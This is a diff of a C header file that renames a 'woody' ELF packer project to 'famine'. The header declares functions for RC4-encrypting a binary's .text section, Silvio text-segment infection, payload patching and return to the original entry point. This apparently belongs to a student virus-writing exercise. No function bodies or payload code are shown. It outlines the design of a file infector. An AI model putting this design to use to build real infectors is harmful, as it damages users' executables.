@@ -80,7 +80,7 @@ enum e_error
 #define PAGE_SIZE 0x1000
 #define KEY_LEN 0x80
 
-#define OUTPUT_FILE_NAME "woody"
+#define OUTPUT_FILE_NAME "famine"
 #define PAYLOAD_NAME "payload"
 
 #define SECTION_TO_ENCRYPT_NAME ".text"
@@ -118,7 +118,7 @@ typedef Elf64_Off t_elf_off;
 /*                          STRUCTS                                         */
 /****************************************************************************/
 
-typedef struct s_woody
+typedef struct s_famine
 {
     void *mmap_ptr;
     void *string_table_ptr;
@@ -152,57 +152,57 @@ typedef struct s_woody
 
     void *infected_file;
     size_t infected_file_size;
-} t_woody;
+} t_famine;
 
 /****************************************************************************/
 /*                          FUNCTIONS DEFINITIONS                           */
 /****************************************************************************/
 
-void check_elf_header(t_woody *woody);
-void set_string_table_ptr(t_woody *woody);
+void check_elf_header(t_famine *famine);
+void set_string_table_ptr(t_famine *famine);
 
-void key_generator(t_woody *woody);
-void cipher_woody_file_data(t_woody *woody);
-char *rc4_cipher(t_woody *woody, char *data, int len);
+void key_generator(t_famine *famine);
+void cipher_famine_file_data(t_famine *famine);
+char *rc4_cipher(t_famine *famine, char *data, int len);
 
-void choose_infection_method(t_woody *woody);
-void silvio_text_infection(t_woody *woody);
+void choose_infection_method(t_famine *famine);
+void silvio_text_infection(t_famine *famine);
 
-size_t find_keysection_offset_elf64(t_woody *woody);
-size_t find_ret2oep_offset_elf64(t_woody *woody);
-size_t find_getencryptedsectionaddr_offset_elf64(t_woody *woody);
-size_t find_getencryptedsectionsize_offset_elf64(t_woody *woody);
+size_t find_keysection_offset_elf64(t_famine *famine);
+size_t find_ret2oep_offset_elf64(t_famine *famine);
+size_t find_getencryptedsectionaddr_offset_elf64(t_famine *famine);
+size_t find_getencryptedsectionsize_offset_elf64(t_famine *famine);
 
-void overwrite_payload_ret2oep(t_woody *woody);
-void overwrite_payload_getencryptedsectionaddr(t_woody *woody);
-void overwrite_payload_getencryptedsectionsize(t_woody *woody);
-void overwrite_keysection_payload(t_woody *woody);
-void overwrite_payload_gettextsectionaddr(t_woody *woody);
-void overwrite_payload_gettextsize(t_woody *woody);
-void load_payload(t_woody *woody, char *payload_name);
+void overwrite_payload_ret2oep(t_famine *famine);
+void overwrite_payload_getencryptedsectionaddr(t_famine *famine);
+void overwrite_payload_getencryptedsectionsize(t_famine *famine);
+void overwrite_keysection_payload(t_famine *famine);
+void overwrite_payload_gettextsectionaddr(t_famine *famine);
+void overwrite_payload_gettextsize(t_famine *famine);
+void load_payload(t_famine *famine, char *payload_name);
 
-size_t find_gettextsize_offset_elf32(t_woody *woody);
-size_t find_getencryptedsectionsize_offset_elf32(t_woody *woody);
-size_t find_gettextsectionaddr_offset_elf32(t_woody *woody);
-size_t find_getencryptedsectionaddr_offset_elf32(t_woody *woody);
-size_t find_ret2oep_offset_elf32(t_woody *woody);
+size_t find_gettextsize_offset_elf32(t_famine *famine);
+size_t find_getencryptedsectionsize_offset_elf32(t_famine *famine);
+size_t find_gettextsectionaddr_offset_elf32(t_famine *famine);
+size_t find_getencryptedsectionaddr_offset_elf32(t_famine *famine);
+size_t find_ret2oep_offset_elf32(t_famine *famine);
 
-size_t find_getencryptedsectionaddr_offset_elf64(t_woody *woody);
-size_t find_gettextsectionaddr_offset_elf64(t_woody *woody);
-size_t find_getencryptedsectionsize_offset_elf64(t_woody *woody);
-size_t find_gettextsize_offset_elf64(t_woody *woody);
-size_t find_ret2oep_offset_elf64(t_woody *woody);
+size_t find_getencryptedsectionaddr_offset_elf64(t_famine *famine);
+size_t find_gettextsectionaddr_offset_elf64(t_famine *famine);
+size_t find_getencryptedsectionsize_offset_elf64(t_famine *famine);
+size_t find_gettextsize_offset_elf64(t_famine *famine);
+size_t find_ret2oep_offset_elf64(t_famine *famine);
 
-void set_woody_ptrs_to_null(t_woody *woody);
-void print_woody_infos(t_woody *woody);
+void set_famine_ptrs_to_null(t_famine *famine);
+void print_famine_infos(t_famine *famine);
 void print_memory_hex(void *memory_ptr, size_t memory_size);
 void print_memory_char(void *memory_ptr, size_t memory_size);
-void free_woody(t_woody *woody);
-void *ft_memcpy(void *dst, const void *src, size_t n);
-size_t ft_strncmp(const char *s1, const char *s2, size_t n);
-size_t ft_strlen(const char *s);
-void ft_bzero(void *s, size_t n);
-void error(int err, t_woody *woody);
+void free_famine(t_famine *famine);
+void *memcpy(void *dst, const void *src, size_t n);
+size_t strncmp(const char *s1, const char *s2, size_t n);
+size_t strlen(const char *s);
+void bzero(void *s, size_t n);
+void error(int err, t_famine *famine);
 
 /****************************************************************************/
 /*                          ASM FUNCTIONS DEFINITIONS                       */
